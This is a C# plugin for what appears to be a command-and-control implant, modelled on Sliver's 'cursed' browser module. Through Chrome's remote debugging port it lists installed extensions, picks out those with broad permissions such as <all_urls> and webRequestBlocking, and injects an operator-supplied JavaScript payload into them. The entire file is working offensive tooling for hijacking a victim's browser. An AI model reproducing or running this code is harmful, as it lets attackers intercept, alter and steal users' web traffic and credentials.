using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using cursed.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {
        //Todo in the cursed.py file, add a `launch` bool that would indicate that the user wants us to handle the execution of chrome with a debug port.
        //https://sliver.sh/docs?name=Cursed maybe implement some of these interactive commands
        //Based on the code in sliver: https://github.com/BishopFox/sliver/blob/master/client/overlord/overlord.go
        public string Name => "cursed";
        private IMessageManager messageManager { get; set; }
        private List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
        private List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };


        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {

            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);

            switch (args.action)
            {
                case "chrome":
                    await CChrome(args);
                    break;
            }
 
        }

        private async Task CChrome(CursedArgs args)
        {
            //Parse for chosen browser
            var extensions = await GetExtensions(args.port.ToString());

            if (extensions.Count <= 0)
            {
                //No extensions installed
                return;
            }

            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();

            foreach (var extension in extensions)
            {
                ExtensionManifest manifest = await GetManifestFromExtension(extension.webSocketDebuggerUrl);

                if (manifest is null)
                {
                    return;
                }

                var permissions = GetPermissionsFromManifest(manifest);

                if (permissions.Count <= 0)
                {
                    return;
                }

                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
                {
                    extensionCandidates.Add(extension);
                }

            }

            if (extensionCandidates.Count <= 0)
            {
                return;
            }

            if (string.IsNullOrEmpty(args.payload))
            {
                return;
            }

            foreach (var extension in extensionCandidates)
            {
                await this.InjectJs(args.payload, extension.webSocketDebuggerUrl);
            }
        }

        private async Task<List<ChromeJsonObject>> GetExtensions(string debugPort)
        {
            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Fetch list of targets from DevTools Protocol
                    string targetsUrl = $"http://localhost:{debugPort}/json/list";
                    string targetsJson = await client.GetStringAsync(targetsUrl);

                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);

                    foreach (var target in targets)
                    {
                        if (target.url.StartsWith("chrome-extension"))
                        {
                            extensions.Add(target);
                        }
                    }
                }
                catch (HttpRequestException)
                {
                    Console.WriteLine("Failed to retrieve extensions information. Make sure Chrome is running.");
                }
            }
            return extensions;
        }
        private async Task<string> InjectJs(string jsCode, string webSocketDebuggerUrl)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                Uri uri = new Uri(webSocketDebuggerUrl);
                await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);

                // Build the DevTools Protocol message to execute JavaScript
                var message = new
                {
                    id = 1,
                    method = "Runtime.evaluate",
                    @params = new
                    {
                        expression = jsCode,
                        returnByValue = true
                    }
                };

                // Convert the message to JSON and send it to the WebSocket
                string messageJson = JsonSerializer.Serialize(message);
                var messageBytes = System.Text.Encoding.UTF8.GetBytes(messageJson);
                await webSocket.SendAsync(new System.ArraySegment<byte>(messageBytes), System.Net.WebSockets.WebSocketMessageType.Text, true, System.Threading.CancellationToken.None);

                // Receive and concatenate WebSocket frames until the entire message is received
                var buffer = new byte[1024];
                var result = await webSocket.ReceiveAsync(new System.ArraySegment<byte>(buffer), System.Threading.CancellationToken.None);
                var responseBuilder = new System.Text.StringBuilder();

                while (!result.EndOfMessage)
                {
                    responseBuilder.Append(System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count));
                    result = await webSocket.ReceiveAsync(new System.ArraySegment<byte>(buffer), System.Threading.CancellationToken.None);
                }

                responseBuilder.Append(System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count));
                return responseBuilder.ToString();
            }
        }

        private async Task<ExtensionManifest> GetManifestFromExtension(string webSocketDebuggerUrl)
        {
            string response = await InjectJs("chrome.runtime.getManifest()", webSocketDebuggerUrl);
            JsonDocument responseJsonDocument = JsonDocument.Parse(response);
            JsonElement responseRoot = responseJsonDocument.RootElement;

            if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
            }

            return new ExtensionManifest();
        }

        private List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
        {
            List<string> permissions = new List<string>();
            foreach (var permission in manifest.result.value.permissions)
            {
                permissions.Add(permission);
            }

            return permissions;
        }
    }
}
